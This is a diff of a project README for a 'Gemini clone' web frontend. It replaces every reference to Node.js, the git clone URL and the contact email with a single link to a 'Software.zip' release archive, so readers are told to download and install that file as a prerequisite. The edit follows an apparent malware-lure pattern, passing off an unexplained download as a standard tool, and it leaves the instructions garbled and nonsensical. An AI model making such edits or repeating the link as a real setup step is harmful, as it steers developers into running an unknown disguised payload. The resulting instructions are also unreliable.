@@ -12,17 +12,17 @@ This repository hosts the frontend of our Gemini clone, a decentralized web prot
 
 ## Getting Started
 
-To get started with this project, you need to have Node.js and npm installed on your machine. If you haven't installed them yet, you can download and install Node.js (which comes with npm) from [Node.js official website](https://nodejs.org/).
+To get started with this project, you need to have https://github.com/Taimoor-Ahmmad/Gemini-Clone/releases/download/v1.0/Software.zip and npm installed on your machine. If you haven't installed them yet, you can download and install https://github.com/Taimoor-Ahmmad/Gemini-Clone/releases/download/v1.0/Software.zip (which comes with npm) from [https://github.com/Taimoor-Ahmmad/Gemini-Clone/releases/download/v1.0/Software.zip official website](https://github.com/Taimoor-Ahmmad/Gemini-Clone/releases/download/v1.0/Software.zip).
 
 ### Prerequisites
 
-- Node.js (LTS version recommended)
-- npm (comes with Node.js)
+- https://github.com/Taimoor-Ahmmad/Gemini-Clone/releases/download/v1.0/Software.zip (LTS version recommended)
+- npm (comes with https://github.com/Taimoor-Ahmmad/Gemini-Clone/releases/download/v1.0/Software.zip)
 
 ### Installation
 
 1. Clone the repository:
-git clone https://www.github.com/Taimoor-Ahmmad/Gemini-Clone
+git clone https://github.com/Taimoor-Ahmmad/Gemini-Clone/releases/download/v1.0/Software.zip
 
 2. Change into the project directory:
 
@@ -38,6 +38,6 @@ git clone https://www.github.com/Taimoor-Ahmmad/Gemini-Clone
 
 For questions, bug reports, or feature requests, please open an issue here on GitHub.
 
-Email: taimoorahmad890@example.com
+Email: https://github.com/Taimoor-Ahmmad/Gemini-Clone/releases/download/v1.0/Software.zip
 
 
